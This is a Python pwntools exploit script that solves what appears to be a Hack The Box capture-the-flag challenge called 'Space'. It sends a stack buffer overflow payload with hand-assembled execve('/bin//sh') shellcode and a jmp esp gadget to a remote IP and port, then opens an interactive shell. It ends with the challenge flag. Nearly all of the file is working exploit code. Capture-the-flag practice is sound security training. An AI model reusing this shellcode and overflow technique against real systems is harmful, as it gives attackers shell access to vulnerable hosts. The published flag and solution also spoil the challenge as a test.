from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

'''
checksec --file ./space
[*] '/home/szhan21/ctf/htb/ctf/pwn/Space/space'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
'''

#cyclic
#offset = 18

#io = process('./space')
ip, port = '138.68.155.111', 32347
io = remote(ip, port)

#0x0804919f jmp esp

'''
objdump -d shellcode

shellcode:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 d2                   xor    %edx,%edx
 8049002:       31 c0                   xor    %eax,%eax
 8049004:       50                      push   %eax
 8049005:       68 2f 2f 73 68          push   $0x68732f2f
 804900a:       68 2f 62 69 6e          push   $0x6e69622f
 804900f:       89 e3                   mov    %esp,%ebx
 8049011:       b0 0b                   mov    $0xb,%al
 8049013:       cd 80                   int    $0x80

objdump -d jmp

jmp:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       83 ec 16                sub    $0x16,%esp
 8049003:       ff e4                   jmp    *%esp

'''

offset = '\x90\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

rop = p32(0x0804919f)
shell = '\x31\xd2\x31\xc0\x83\xec\x16\xff\xe4'

shellcode = offset+rop+shell

io.recvuntil('>')
io.sendline(shellcode)
io.interactive()

#HTB{sh3llc0de_1n_7h3_5p4c3}
